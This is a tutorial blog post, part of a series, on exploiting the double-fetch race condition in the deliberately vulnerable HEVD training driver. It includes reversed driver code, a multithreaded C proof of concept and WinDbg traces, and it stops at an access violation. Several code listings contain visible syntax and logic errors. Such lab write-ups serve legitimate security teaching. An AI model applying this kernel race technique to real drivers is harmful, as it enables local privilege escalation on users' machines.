---
title: HackSys Extreme Vulnerable Driver 3 - Double Fetch
date: 2022-05-21
tags: ["windows-kernel-exploitation"]
hide:
    - navigation
---

## Introduction

This post is part of a series on Hacksys Extreme Vulnerable Driver, if you have not read my [previous post](/Posts/2022-05-14-HEVD3-StackOverflow/) I would suggest reading it unless you're already familiar with kernel exploitation on Windows.

In this post we will be exploring a Double Fetch vulnerability. - we assume that you already have an environment setup to follow along. However, if you don't have an environment setup in this post we use:

- Windows 10 Pro x64 RS1
- HEVD 3.00

If you are not sure how to setup a kernel debugging environment you can find plenty of posts of the process online, we will not cover the process in this post.

<hr>

# Double Fetch

Before covering the vulnerability lets first talk a bit about what a Double Fetch bug actually is. In short a Double Fetch is a specific type of time-of-check to time-of-use bug. The general cause is when a process reads an untrusted variable more than once without re-verifying any checks of the variable on the second read. These bugs are very common in shared memory interfaces. I would highly recommend you read [this research report](https://research.nccgroup.com/2022/03/28/whitepaper-double-fetch-vulnerabilities-in-c-and-c/) by Nick Dunn from NCC Group.

# Reversing the Driver

In this post we will assume that you have read the [previous post](https://linxz.tech/post/hevd/2022-05-14-hevd3-stackbufferoverflow/) in which we explore a simple stack buffer overflow in HEVD, if you have not read that post I'd recommend you read it as it is a nice introduction to driver exploitation on Windows.

As noted in the previous post the IRP handler is located at `sub_140085078` however we will refer to this function as `IrpDeviceIoCtlHandler` going forward.

## Locating the IOCTL Handler

To find the vulnerable function we can simply do a string search for "double fetch" which should lead us to the vulnerable function.

## Reversing the Vulnerable Function

Now that we've located the vulnerable function we can begin reversing it and looking for the vulnerability.

```C title="Vulnerable Function"
char Dst[2048]; // kernel stack allocated buffer

memset(Dst, 0, sizeof(Dst));         
ProbeForRead(Address, 0x10, 1u);         // check user-mode buffer Address in user-mode and aligned

DbgPrintEx(0x4Du, 3u, "[+] UserDoubleFetch->Buffer: 0x%p\n", *(const void **)Address);  //  Address->Buffer
DbgPrintEx(0x4Du, 3u, "[+] UserDoubleFetch->Size: 0x%X\n", *((_QWORD *)Address + 1));   //  Address->Size

check_size = *((_QWORD *)Address + 1);                                                  //  set v2 = Address->Size
if ( check_size <= 2048 ) {
    DbgPrintEx(0x4Du, 3u, "[+] Triggering Double Fetch\n");
    RtlCopyMemory(Dst, *(const void **)Address, *((_QWORD *)Address + 1));

    result = 0;
}

else {
    DbgPrintEx(0x4Du, 3u, "[-] Invalid Buffer Size: 0x%X\n", CheckSize);
    result = 3221225485;
}

  return result;
}
```

Starting from the top of the above decompilation we can see that there's a stack allocated buffer `Dst` that is 2048 bytes, that buffer then gets zero'd out with memset. Following that a call to `ProbeForRead` verifies that out user-mode buffer is:

1. Actually in user-mode
2. Aligned correctly

Moving down the function we have two `DbgPrintEx` calls which are there to assist us with reversing the vulnerabilities. These two print statements show us that the format of our user-mode buffer is actually a struct with the first member being the buffer itself and the second member being the size. The below code block is shown to help visualise the situation. *Note this below code block is not from HEVD*.

```C title="Example UserModeBuffer Structure"
UserModeBuffer {
	char    Buffer
	size_t  BufferSize
}
```

If we keep moving down the function we can see that a local variable is assigned to the value of `Address+1` which we know is the size member of our structure based on the print statements before. That local variable is then checked against the size of the stack allocated buffer 2048 bytes.

If the value of `Address+1` is less-than or equal to 2048 bytes then we will execute an `RtlCopyMemory` of our user-mode structure into the stack allocated buffer `Dst` with the size specified in `Address+1`. If however anything other than that size check is passed, we will fall into the else condition and receive an `Invalid Buffer Size` error and return an error code.

At this point it should be pretty clear where the vulnerability is here. Let's re-examine the case of us passing the size check in more detail to fully understand the bug. *I've cleaned up the decompilation slightly for ease of reading*.

```C title="Size Check in Detail"
check_size = (UserBuffer->Size); // (1)

if ( check_size <= 2048 ) {
    DbgPrintEx(0x4D, 3, "[+] Triggering Double Fetch\n");
    RtlCopyMemory(Dst, UserBuffer->Buffer, UserBuffer->Size); // (2)

    result = 0;
}
```

1. `UserBuffer->Size` is fetched once here before the size check
2. `UserBuffer->Size` is then fetched again to use as the size in the copy, even though a local variable `check_size` has the size after the first fetch

So we know that our input is in the form of a structure where the first member is our buffer and the second member is a size, we also know that before we can perform a copy from the user-mode buffer into the stack allocated buffer a size check is performed. If that size check is **less-than or equal to 2048** (the size of `Dst`) then we'll perform the copy. 

However, there is a problem here in the copy. Notice how the `UserBuffer->Size` member is actually **fetched** twice. It is first fetched for the size check and then it is **fetched** again for the copy, here lies the vulnerability. Instead of using the `check_size` value in the copy, the code fetches our structure member again, this is wrong. The question becomes what if we can somehow pass this size check but then after we pass it give a bigger size than the size value that was used in order to pass the check?

<hr>

# Dynamic Analysis

Now that we've performed static analysis of the suspected vulnerability it is time to start building a program to interact with the code and prove that our suspected vulnerability is in-fact exploitable.

## Interacting with the Driver

Similarly to the last post we're going to choose to use C in order to interact with the driver, I explained my reasoning for using C in the last post, I won't cover them again here. We also need to keep in mind that in order to exploit this vulnerability we're going to need two threads, if we do this in a single thread, we won't be able to exploit the vulnerability, and we'll show why shortly.

To get us started we'll need to open a handle to the device, the below code block will do that. It is almost identical to the method we used in the previous post only this time it has its own function. If you're following along for yourself I would actually recommend that you create a separate source file with some utility functions in, and put this there since you're going to need to open a handle for everything anyways. I am simply including it for clarity.

```C title="Simple Driver Interaction"
#include <Windows.h>
#include <stdio.h>

#define DRIVER "\\\\.\\HacksysExtremeVulnerableDriver"
#define IOCTL_CODE 0x222037

HANDLE OpenDriverHandle(void)
{
    HANDLE DriverHandle = NULL;
    DriverHandle = CreateFileA(DRIVER, GENERIC_READ | GENERIC_WRITE, 0, NULL OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (DriverHandle == INVALID_HANDLE_VALUE)
    {
        printf("[!] FATAL: Failed to open driver handle!"\n);
        exit(-1);
    }
    else
    {
        printf("[+] Opened Driver Handle: 0x%x", DriverHandle);
        return DriverHandle;
    }
}

int main()
{
    printf("[+] HEVD: Double Fetch\n");

    printf("[*] Opening handle to driver!\n);
    HANDLE DriverHandle = OpenDeviceHandle()
}
```

Now that we've got a handle to the device we'll also need to issue a `DeviceIoControl` request in order to interact with the IOCTL for our Double Fetch function. The below code block is the additional code added in order to make that request. *Bear in mind currently this is all single-threaded.*

```C title="Beginnings of an exploit function"
typedef struct _USER_DOUBLE_FETCH
{
    LPVOID  Buffer;
    SIZE_T  Size;
} USER_DOUBLE_FETCH, *PUSER_DOUBLE_FETCH;

void exploit(DriverHandle)
{

    LPVOID  UserBuffer = {0};
    SIZE_T  UserBufferSize = 2048;

    /* Allocate USER_DOUBLE_FETCH struct */
    USER_DOUBLE_FETCH* PtrUserDoubleFetch = (USER_DOUBLE_FETCH*)VirtualAlloc(NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE | PAGE_NOCACHE);
    if(!PtrUserDoubleFetch)
    {
        printf("[!] FATAL: Unable to allocate USER_DOUBLE_FETCH struct!\n");
        return;
    }

    /* Allocate USER_DOUBLE_FETCH members */
    UserBuffer = (LPVOID)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, UserBufferSize);
    if(!UserBuffer)
    {
        printf("[!] FATAL: Failed to allocate heap buffer!\n");
        return;
    }

    /* Initialize USER_DOUBLE_FETCH struct members */
    PtrUserDoubleFetch->Buffer  = UserBuffer;
    PtrUserDoubleFetch->Size    = UserBufferSize;

    if (!DeviceIoControl(DriverHandle, IOCTL_CODE, PtrUserDoubleFetch, PtrUserDoubleFetch->Size, NULL, 0, NULL, NULL))
    {
        printf("[!] FATAL: Error sending IOCTL to driver!\n");
        return;
    }

}
```

In the above code block we first define a structure called `_USER_DOUBLE_FETCH` note the use of a typedef here, if you're unsure about the purpose of that then I'd recommend reading [this answer](https://stackoverflow.com/questions/252780/why-should-we-typedef-a-struct-so-often-in-c) and [this answer](https://stackoverflow.com/questions/44020831/why-to-use-an-underscore-for-a-struct-in-c) on StackOverflow, in short, it makes our life easier. Inside our structure we've defined two members, the same members which are defined in the driver based on the `DbgPrint` statements we saw. The [first is a pointer](https://stackoverflow.com/questions/494163/what-is-pvoid-data-type) to a buffer and the second is a size value.

In the next part of the code at the top of the `exploit()` function we allocate our created structure on the stack using a call to `VirtualAlloc`, then we check that the allocation was successful. One particularly important part of our call to `VirtualAlloc` is the use of `PAGE_NOCACHE` as the name suggests this sets the allocated pages to be non-cacheable, this is particularly important in regards to winning race conditions because a cached page could interfere with us winning the race. You can find more detail on that particularity in this [fantastic paper](https://static.googleusercontent.com/media/research.google.com/en//pubs/archive/42189.pdf) published by Gynvael Coldwind from Google.

Directly after we then perform a `HeapAlloc` for the `UserBuffer` and we use the `UserBufferSize` defined at the top of the `exploit()` function. Remember at this point we are not trying to exploit the vulnerability we are simply trying to verify we can successfully interact with it. Following the heap allocation we initialize the structure members with our defined `UserBuffer` and `UserBufferSize` values respectively.

Finally we issue our `DeviceIoControl` request in order to interact with the vulnerable IOCTL. As you can see already, there is a significant amount of more work required here compared to the buffer overflow in the previous post. In the below code block you can see the finished result of everything we've just covered.

### Exploit Summary 0x1

```C title="Exploit so Far"
#include <Windows.h>
#include <stdio.h>

#define DRIVER "\\\\.\\HacksysExtremeVulnerableDriver"
#define IOCTL_CODE 0x222037

typedef struct _USER_DOUBLE_FETCH
{
    LPVOID  Buffer;
    SIZE_T  Size;
} USER_DOUBLE_FETCH, *PUSER_DOUBLE_FETCH;

HANDLE OpenDriverHandle(void)
{
    HANDLE DriverHandle = NULL;
    DriverHandle = CreateFileA(DRIVER, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (DriverHandle == INVALID_HANDLE_VALUE)
    {
        printf("[!] FATAL: Failed to open driver handle!\n");
        exit(-1);
    }
    else
    {
        printf("[+] Opened Driver Handle: 0x%x\n", DriverHandle);
        return DriverHandle;
    }
}

void exploit(DriverHandle)
{

    LPVOID  UserBuffer = {0};
    SIZE_T  UserBufferSize = 2048;

    /* Allocate USER_DOUBLE_FETCH struct */
    USER_DOUBLE_FETCH* PtrUserDoubleFetch = (USER_DOUBLE_FETCH*)VirtualAlloc(NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE | PAGE_NOCACHE);
    if(!PtrUserDoubleFetch)
    {
        printf("[!] FATAL: Unable to allocate USER_DOUBLE_FETCH struct!\n");
        return;
    }

    /* Allocate USER_DOUBLE_FETCH members */
    UserBuffer = (LPVOID)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, UserBufferSize);
    if(!UserBuffer)
    {
        printf("[!] FATAL: Failed to allocate heap buffer!\n");
        return;
    }

    /* Initialize USER_DOUBLE_FETCH struct members */
    PtrUserDoubleFetch->Buffer  = UserBuffer;
    PtrUserDoubleFetch->Size    = UserBufferSize;

    if (!DeviceIoControl(DriverHandle, IOCTL_CODE, PtrUserDoubleFetch, PtrUserDoubleFetch->Size, NULL, 0, NULL, NULL))
    {
        printf("[!] FATAL: Error sending IOCTL to driver!\n");
        return;
    }
}

int main()
{
    printf("[+] HEVD: Double Fetch\n");

    printf("[*] Opening handle to driver!\n");
    HANDLE DriverHandle = OpenDriverHandle();

    printf("[*] Running exploit function!\n");
    exploit(DriverHandle);
}
```

At this point we want to verify that we can interact with the driver and specifically the correct IOCTL. We'll set a breakpoint in our debugger on `HEVD!TriggerDoubleFetch`. Then we'll run the POC so far and verify that we can interact with the vulnerable function.

```C
0: kd> bp HEVD!TriggerDoubleFetch

0: kd> g
Breakpoint 0 hit
HEVD!TriggerDoubleFetch:
fffff805`b494681c 488bc4          mov     rax,rsp
```

Perfect. We can interact with the function. What we'll do now is take a look at the behaviour we mentioned earlier in regards to the size check followed by the copy. In order to do this we'll add a `memset()` to our POC and set the buffer struct member to be filled with 0x41s. Then we'll set a breakpoint on the function and verify that: 

1. our buffer is used 
2. that we can perform the copy from user-mode to kernel-mode as long as we don't violate the size check.

```C title="Checking our input"
0: kd> bp HEVD!TriggerDoubleFetch+0x41

0: kd> g
Breakpoint 0 hit
HEVD!TriggerDoubleFetch:
fffff805`b494681c 488bc4          mov     rax,rsp

1: kd> g
Breakpoint 1 hit
HEVD!TriggerDoubleFetch+0x41:
fffff805`b494685d ff15e5b7f7ff    call    qword ptr [HEVD!_imp_ProbeForRead (fffff805`b48c2048)]

1: kd> p
HEVD!TriggerDoubleFetch+0x47:
fffff805`b4946863 4c8bcf          mov     r9,rdi

1: kd> dq rdi // (1)
0000018c`389b0000  0000018c`38a252b0 00000000`00000800
0000018c`389b0010  00000000`00000000 00000000`00000000
0000018c`389b0020  00000000`00000000 00000000`00000000
0000018c`389b0030  00000000`00000000 00000000`00000000
0000018c`389b0040  00000000`00000000 00000000`00000000
0000018c`389b0050  00000000`00000000 00000000`00000000
0000018c`389b0060  00000000`00000000 00000000`00000000
0000018c`389b0070  00000000`00000000 00000000`00000000

1: kd> dq 0000018c`38a252b0
0000018c`38a252b0  41414141`41414141 41414141`41414141
0000018c`38a252c0  41414141`41414141 41414141`41414141
0000018c`38a252d0  41414141`41414141 41414141`41414141
0000018c`38a252e0  41414141`41414141 41414141`41414141
0000018c`38a252f0  41414141`41414141 41414141`41414141
0000018c`38a25300  41414141`41414141 41414141`41414141
0000018c`38a25310  41414141`41414141 41414141`41414141
0000018c`38a25320  41414141`41414141 41414141`41414141

1: kd> ? 800
Evaluate expression: 2048 = 00000000`00000800
```

1. RDI has the address `0000018c38a252b0` which is a pointer to our buffer.

Great, we can verify that our buffer is stored in a pointer that is in the RDI register. We can also see that the decimal value 800 is in RDI also, converting 800 to hex we get the value 2048 which is our size. Now we'll continue stepping through the function and ensure that we pass the size check and as a result perform the copy.

```C title="Passing the size check"
1: kd> r
rax=0000000000000000 rbx=0000000000000000 rcx=000000000000004d
rdx=0000000000000003 rsi=0000000000000003 rdi=0000018c389b0000
rip=fffff805b49468df rsp=ffffb40015e3df90 rbp=ffff8f886e5c87c0
 r8=000000000000004d  r9=0000000000000800 // (2) r10=0000000000000000
r11=ffffb40015e3df88 r12=0000000000000000 r13=ffff8f886d97c6b0
r14=000000000000004d r15=0000000000000800 // (1)
iopl=0         nv up ei ng nz na po nc
cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000286

HEVD!TriggerDoubleFetch+0xc3:
fffff805`b49468df 4d3bcf          cmp     r9,r15

1: kd> p
HEVD!TriggerDoubleFetch+0xc6:
fffff805`b49468e2 7614            jbe     HEVD!TriggerDoubleFetch+0xdc (fffff805`b49468f8)

1: kd> 
HEVD!TriggerDoubleFetch+0xdc:
fffff805`b49468f8 4c8d05f1280000  lea     r8,[HEVD! ?? ::NNGAKEGL::`string' (fffff805`b49491f0)]

1: kd> dq @rdx
0000018c`38a252b0  41414141`41414141 41414141`41414141
0000018c`38a252c0  41414141`41414141 41414141`41414141
0000018c`38a252d0  41414141`41414141 41414141`41414141
0000018c`38a252e0  41414141`41414141 41414141`41414141
0000018c`38a252f0  41414141`41414141 41414141`41414141
0000018c`38a25300  41414141`41414141 41414141`41414141
0000018c`38a25310  41414141`41414141 41414141`41414141
0000018c`38a25320  41414141`41414141 41414141`41414141

1: kd> dq @rcx
ffffb400`15e3dfb0  00000000`00000000 00000000`00000000
ffffb400`15e3dfc0  00000000`00000000 00000000`00000000
ffffb400`15e3dfd0  00000000`00000000 00000000`00000000
ffffb400`15e3dfe0  00000000`00000000 00000000`00000000
ffffb400`15e3dff0  00000000`00000000 00000000`00000000
ffffb400`15e3e000  00000000`00000000 00000000`00000000
ffffb400`15e3e010  00000000`00000000 00000000`00000000
ffffb400`15e3e020  00000000`00000000 00000000`00000000

1: kd> r
rax=0000000000000000 rbx=0000000000000000 rcx=ffffb40015e3dfb0
rdx=0000018c38a252b0 rsi=0000000000000003 rdi=0000018c389b0000
rip=fffff805b4946911 rsp=ffffb40015e3df90 rbp=ffff8f886e5c87c0
 r8=0000000000000800  r9=0000000000000001 r10=0000000000000000
r11=ffffb40015e3df88 r12=0000000000000000 r13=ffff8f886d97c6b0
r14=000000000000004d r15=0000000000000800
iopl=0         nv up ei ng nz na po nc
cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000286

HEVD!TriggerDoubleFetch+0xf5:
fffff805`b4946911 e8aaa8f7ff      call    HEVD!memcpy (fffff805`b48c11c0)

1: kd> p
HEVD!TriggerDoubleFetch+0xfa:
fffff805`b4946916 eb1b            jmp     HEVD!TriggerDoubleFetch+0x117 (fffff805`b4946933)

1: kd> dq @rcx
ffffb400`15e3dfb0  41414141`41414141 41414141`41414141
ffffb400`15e3dfc0  41414141`41414141 41414141`41414141
ffffb400`15e3dfd0  41414141`41414141 41414141`41414141
ffffb400`15e3dfe0  41414141`41414141 41414141`41414141
ffffb400`15e3dff0  41414141`41414141 41414141`41414141
ffffb400`15e3e000  41414141`41414141 41414141`41414141
ffffb400`15e3e010  41414141`41414141 41414141`41414141
ffffb400`15e3e020  41414141`41414141 41414141`41414141
```

1. `R15` has our input size.
2. `R9` has the size of the stack allocated buffer

Awesome, we clearly are able to execute a copy providing that we don't violate the size value. The question now is how we can make it such that we pass the size check with one value but then change that value so that we actually copy more. The answer is, multithreading.

## Getting Started with Multithreading

If you're not familar with multithreading it can be quite daunting at first. I'll do my best to describe all of the steps throughly however I am not a developer so if you're still unsure I'd highly recommend doing external reading around multithreading particularly in C.

The first thing we'll want to do is check that we have enough processors to exploit the bug, when targeting TOCTOU and similar bugs its important that we can win the race. That is, if we don't have enough compute power then the attack will take significantly longer to exploit successfully. In order to check if we have enough processors we can use the `processthreadsapi` API. The below code block is a very simple function to check our number of processors and fail if we don't have more than 2. *This is especially important as I am exploiting this vulnerability in a virtual machine, not on my host.*

```C title="Check how many processors we have"
#include <processthreadsapi.h>

int CheckProcessors(void)
{
    SYSTEM_INFO SystemInfo = {0};

    /* Check if we have more than 2 processors as attack will take too long with less */
    GetSystemInfo(&SystemInfo);
    if (SystemInfo.dwNumberOfProcessors < 2)
    {
        printf("[!] FATAL: You don't have enough processors, exiting!\n");
        exit(-1);
    }

    int NumProcessors = SystemInfo.dwNumberOfProcessors;
    return NumProcessors;
}
```

In order to pass data into threads the easiest way is to create a strucutre for the thread and then pass that structure when we create the thread. We'll create a structure for our function which will send the IOCTLs to the driver. It looks fairly similar to the structure we created earlier for `UserDoubleFetch`. Notice the two members here are `DriverHandle` and `DoubleFetch` was a pointer to the `_USER_DOUBLE_FETCH` structure that we created earlier.

```C title="Structure to pass data to our IOCTL thread"
typedef struct _IO_THREAD_PARAM
{
    HANDLE              DriverHandle; // (1)
    PUSER_DOUBLE_FETCH  DoubleFetch; // (2)
} IO_THREAD_PARAM, *PIO_THREAD_PARAM;
```

1. This will store the handle to the driver which we'll need to issue IOCTLs.
2. This is a pointer to our DoubleFetch buffer that we'll use for the exploit.

The next step is for us to create a thread specifically for updating the structures size member. First we'll create a new function that's sole purpose is modifying the size value of the structure. The function is fairly simple, one thing you might be unfamiliar with is the use of [`GetCurrentProcessorNumber()`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocessornumber) this is a function definied in `processthreadsapi.h` this is mostly just to help us with debugging during exploitation.

```C title="A thread to change the UserBuffer->Size member"
DWORD WINAPI ChangeSizeThread(LPVOID Size)
{
    BOOL ExploitSuccess;
    int i = 0;

    printf("[+] Changing size on processor %d\n", GetCurrentProcessorNumber());

    while (!ExploitSuccess)
    {
        *(PULONG)Size ^= 0x00000808;    // 2056 bytes
    }
    
    return EXIT_SUCCESS;
}
```

Next we'll need to create a function that will solely send our `DeviceIoControl` request this is important because we won't win the race first time and we need to be able to keep sending requests for every time we try to update the size of the struct member.

```C title="A thread to issue IOCTL requests for the exploit"
DWORD WINAPI IoControlThread(LPVOID IoThreadParam)
{
    BOOL    ExploitSuccess;

    HANDLE              DriverHandle = NULL;
    PIO_THREAD_PARAM    IoControlThreadParam = NULL;
    PUSER_DOUBLE_FETCH  UserDoubleFetch = NULL;

    DWORD   BytesReturned = 0;
    int     i = 0;

    /* Get pointer to thread parameter structure */
    IoControlThreadParam = (PIO_THREAD_PARAM)IoThreadParam;

    /* Get thread paremeter structure members  */
    UserDoubleFetch = IoControlThreadParam->DoubleFetch;
    DriverHandle = IoControlThreadParam->DriverHandle;

    printf("[+] Sending IOCTL on processor %d\n", GetCurrentProcessorNumber());

    while (!ExploitSuccess)
    {
        if(!DeviceIoControl(DriverHandle, IOCTL_CODE, UserDoubleFetch, 3000, NULL, NULL, &BytesReturned, NULL))
        {
            printf("[!] FATAL: Unable to send IOCTL to driver!\n");
        }
    }

    return EXIT_SUCCESS;
}
```

Now that we've created a function to change the size value and a function to send the IOCTLs to the driver we'll need to create threads for those functions respectively. In addition to creating the threads we'll also want to do some basic thread management in that we'll need to change the thread priority via the [`SetThreadPriority`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadpriority) function, doing this enables us to more easily win the race as we tell the scheduler to place our threads at the top of the order of execution.

Additionally, we'll also want to set the threads affinity mask via the [`SetThreadAffinityMask`](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-setthreadaffinitymask) function. This function allows us to tell the scheduler exactly **what** processor our thread should run on. It is worth noting that we should be careful when manually setting the Affinity mask as noted in [this answer](https://stackoverflow.com/a/5919745) on StackOverflow. In order to simulate the behaviour described in that answer, i.e, setting the affinity mask from outside the thread and then shifting by 1 each round, we'll put our code inside a loop with the value of our max number of processors as our stopping point.

```C title="Initialising thread structure and creating threads to run for exploit"

    /* Allocate IO_THREAD_PARAM struct */
    IoThreadParam = (PIO_THREAD_PARAM*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(IO_THREAD_PARAM));
    if(!IoThreadParam)
    {
        printf("[!] FATAL: Failed to allocate memory for IO thread!\n");
        return;
    }

    /* Initialise IO_THREAD_PARAM struct members */
    IoThreadParam->DriverHandle = DriverHandle;
    IoThreadParam->DoubleFetch  = PtrUserDoubleFetch;

    for (int i = 0; i < NumProcessors; i++)
    {
        HANDLE ChangeSizeHandle = CreateThread(NULL, NULL, ChangeSizeThread, &PtrDoubleFetch->Size, CREATE_SUSPENDED, NULL);
        HANDLE IoControlHandle = CreateThread(NULL, NULL, IoControlThread, IoThreadParam, CREATE_SUSPENDED, NULL);

        if (!SetThreadPriority(ChangeSizeHandle, THREAD_PRIORITY_TIME_CRITICAL) || !SetThreadPriority(IoControlHandle, THREAD_PRIORITY_TIME_CRITICAL))
        {
            printf("[!] FATAL: Unable to set thread priority to highest!\n");
        }
        printf("[+] Set ChangeSizeThread Priority to %d\n", GetThreadPriority(ChangeSizeHandle));
        printf("[+] Set IoControlThread Priority to %d\n", GetThreadPriority(IoControlHandle));

        if (!SetThreadAffinityMask(ChangeSizeHandle, 1 << i) || !SetThreadAffinityMask(IoControlHandle, 1 << i + 1))
        {
            printf("[!] FATAL: Unable to set thread affinity!\n");
        }

        ResumeThread(ChangeSizeHandle);
        ResumeThread(IoControlHandle);

        if (WaitForMultipleObjects(NumProcessors, ChangeSizeHandle, TRUE, INFINITE))
        {
            TerminateThread(ChangeSizeHandle, EXIT_SUCCESS);
            CloseHandle(ChangeSizeHandle);
            printf("[+] Terminated change size thread!\n");
        }
    
        if (WaitForSingleObjects(NumProcessors, IoControlHandle, TRUE, INFINITE))
        {
            TerminateThread(IoControlHandle, EXIT_SUCCESS);
            CloseHandle(IoControlHandle);
            printf("[+] Terminated IO control thread!\n");
        }

    }
```

We've done a lot of work up to this point, let's take a look at the code altogether to recap where we've got to. **I realise this code is quite daunting, at the end of the post I'll put a link to my full POC which I'll litter with comments.**

### Exploit Summary 0x2

```C title="Exploit so far"
#include <Windows.h>
#include <stdio.h>
#include <processthreadsapi.h>

#define DRIVER "\\\\.\\HacksysExtremeVulnerableDriver"
#define IOCTL_CODE 0x222037

typedef struct _USER_DOUBLE_FETCH
{
    LPVOID  Buffer;
    SIZE_T  Size;
} USER_DOUBLE_FETCH, *PUSER_DOUBLE_FETCH;

typedef struct _IO_THREAD_PARAM
{
    HANDLE              DriverHandle;
    PUSER_DOUBLE_FETCH  DoubleFetch;
} IO_THREAD_PARAM, *PIO_THREAD_PARAM;

HANDLE OpenDriverHandle(void)
{
    HANDLE DriverHandle = NULL;
    DriverHandle = CreateFileA(DRIVER, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (DriverHandle == INVALID_HANDLE_VALUE)
    {
        printf("[!] FATAL: Failed to open driver handle!\n");
        exit(-1);
    }
    else
    {
        printf("[+] Opened Driver Handle: 0x%x\n", DriverHandle);
        return DriverHandle;
    }
}

int CheckProcessors(void)
{
    SYSTEM_INFO SystemInfo = {0};

    /* Check if we have more than 2 processors as attack will take too long with less */
    GetSystemInfo(&SystemInfo);
    if (SystemInfo.dwNumberOfProcessors < 2)
    {
        printf("[!] FATAL: You don't have enough processors, exiting!\n");
        exit(-1);
    }

    int NumProcessors = SystemInfo.dwNumberOfProcessors;
    return NumProcessors;
}

DWORD WINAPI ChangeSizeThread(LPVOID Size)
{
    BOOL    ExploitSuccess;

    int i = 0;

    printf("[+] Changing size on processor %d\n", GetCurrentProcessorNumber());

    while (!ExploitSuccess)
    {
        *(PULONG)Size ^= 0x00000BB8;
    }
    return EXIT_SUCCESS;
}

DWORD WINAPI IoControlThread(LPVOID IoThreadParam)
{
    BOOL    ExploitSuccess;

    PIO_THREAD_PARAM IoControlThreadParam = NULL;
    HANDLE DriverHandle = NULL;
    PUSER_DOUBLE_FETCH UserDoubleFetch = NULL;

    DWORD   BytesReturned = 0;
    int     i = 0;

    printf("[+] Sending IOCTL on processor %d\n", GetCurrentProcessorNumber());

    IoControlThreadParam = (PIO_THREAD_PARAM)IoThreadParam;
    UserDoubleFetch = IoControlThreadParam->DoubleFetch;
    DriverHandle = IoControlThreadParam->DriverHandle;

    while (!ExploitSuccess)
    {
        if (!DeviceIoControl(DriverHandle, IOCTL_CODE, UserDoubleFetch, 3000, NULL, NULL, &BytesReturned, NULL))
        {
            printf("[!] FATAL: Unable to send IOCTL to driver!\n");
        }
    }
    return EXIT_SUCCESS;
}

void exploit(DriverHandle)
{

    LPVOID  UserBuffer = {0};
    SIZE_T  UserBufferSize = 2048;

    PIO_THREAD_PARAM IoThreadParam = NULL;

    int NumProcessors = CheckProcessors();

    /* Allocate USER_DOUBLE_FETCH struct */
    USER_DOUBLE_FETCH* PtrUserDoubleFetch = (USER_DOUBLE_FETCH*)VirtualAlloc(NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE | PAGE_NOCACHE);
    if(!PtrUserDoubleFetch)
    {
        printf("[!] FATAL: Unable to allocate USER_DOUBLE_FETCH struct!\n");
        return;
    }

    /* Allocate USER_DOUBLE_FETCH members */
    UserBuffer = (LPVOID)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, UserBufferSize);
    if(!UserBuffer)
    {
        printf("[!] FATAL: Failed to allocate heap buffer!\n");
        return;
    }

    /* Initialize USER_DOUBLE_FETCH struct members */
    PtrUserDoubleFetch->Buffer  = UserBuffer;
    PtrUserDoubleFetch->Size    = UserBufferSize;

    /* Allocate IO_THREAD_PARAM struct */
    IoThreadParam = (PIO_THREAD_PARAM*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(IO_THREAD_PARAM));
    if(!IoThreadParam)
    {
        printf("[!] FATAL: Failed to allocate memory for IO thread!\n");
        return;
    }

    /* Initialise IO_THREAD_PARAM struct members */
    IoThreadParam->DriverHandle = DriverHandle;
    IoThreadParam->DoubleFetch  = PtrUserDoubleFetch;


    for (int i = 0; i < NumProcessors; i += 2)
    {
        HANDLE ChangeSizeHandle = CreateThread(NULL, NULL, ChangeSizeThread, &PtrUserDoubleFetch->Size, CREATE_SUSPENDED, NULL);
        HANDLE IoControlHandle = CreateThread(NULL, NULL, IoControlThread, IoThreadParam, CREATE_SUSPENDED, NULL);

        if (!SetThreadPriority(ChangeSizeHandle, THREAD_PRIORITY_TIME_CRITICAL) || !SetThreadPriority(IoControlHandle, THREAD_PRIORITY_TIME_CRITICAL))
        {
            printf("[!] FATAL: Unable to set thread priority to highest!\n");
        }
        printf("[+] Set ChangeSizeThread Priority to %d\n", GetThreadPriority(ChangeSizeHandle));
        printf("[+] Set IoControlThread Priority to %d\n", GetThreadPriority(IoControlHandle));

        if (!SetThreadAffinityMask(ChangeSizeHandle, 1 << i) || !SetThreadAffinityMask(IoControlHandle, 1 << i + 1))
        {
            printf("[!] FATAL: Unable to set thread affinity!\n");
        }

        ResumeThread(ChangeSizeHandle);
        ResumeThread(IoControlHandle);

        if (WaitForMultipleObjects(NumProcessors, ChangeSizeHandle, TRUE, INFINITE))
        {
            TerminateThread(ChangeSizeHandle, EXIT_SUCCESS);
            CloseHandle(ChangeSizeHandle);
            printf("[+] Terminated change size thread!\n");
        }

        if (WaitForMultipleObjects(NumProcessors, IoControlHandle, TRUE, INFINITE))
        {
            TerminateThread(IoControlHandle, EXIT_SUCCESS);
            CloseHandle(IoControlHandle);
            printf("[+] Terminated IO control thread!\n");
        }

    }
}

int main()
{
    printf("[+] HEVD: Double Fetch\n");

    printf("[*] Opening handle to driver!\n");
    HANDLE DriverHandle = OpenDriverHandle();

    printf("[*] Running exploit function!\n");
    exploit(DriverHandle);
}
```

<hr>

# Exploitation

If we run the above code on our vulnerable machine after a short while we should get an access violation. In the current code we'll get this access violation due to an invalid memory access as we've not actually over filled the buffer yet. However, an access violation is good news, it means we're nearly there.

```
Access violation - code c0000005 (!!! second chance !!!)
HEVD!TriggerDoubleFetch+0x136:
fffff801`11086952 c3              ret

1: kd> !analyze
